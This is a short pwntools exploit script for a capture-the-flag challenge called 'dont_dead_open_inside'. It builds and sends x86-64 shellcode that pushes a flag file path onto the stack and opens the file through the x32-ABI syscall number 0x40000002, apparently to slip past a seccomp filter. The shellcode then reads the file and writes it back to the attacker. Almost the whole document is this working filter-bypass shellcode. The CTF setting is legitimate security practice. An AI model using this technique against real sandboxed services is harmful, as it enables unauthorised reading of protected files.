#!/usr/bin/python2
from pwn import *

context.binary = ELF('./src/dont_dead_open_inside')

def start(is_remote=False):
    if is_remote:
        return remote("localhost", 6000), "/dont_dead_open_inside_flag.txt"
    return process(context.binary.path), "./dont_dead_open_inside_flag.txt"

p, flag = start(True)
pause()

def chunkstring(string, length):
    return [string[0+i:length+i].ljust(length, '\x00') for i in range(0, len(string), length)]

def push_str(s):
    result = ""
    s += "\x00"
    parts = chunkstring(s, 8)[::-1]
    for part in parts:
        result += "mov rax, " + str(hex(u64(part))) + "\n"
        result += "push rax\n"
    return result

code = push_str(flag)
code += """
    mov    rbp, rsp
    mov    rsi,0x0
    mov    rdi,rsp          /* /flag */
    mov    rax,0x40000002
    mov    rdx, 0
    syscall                 /* sys_open */

    mov rdi, rax
    mov rsi, 0x601000       /* bss */
    mov rdx, 0x40
    xor rax, rax
    syscall                 /* sys_read */

    mov rdi, 1
    mov rax, 1
    syscall

    mov rsp, rbp
    ret
"""
shellcode = asm(code)
p.send(shellcode)
p.recvuntil("shellcode: ")
flag = p.recvall()

log.success("FLAG: " + flag)
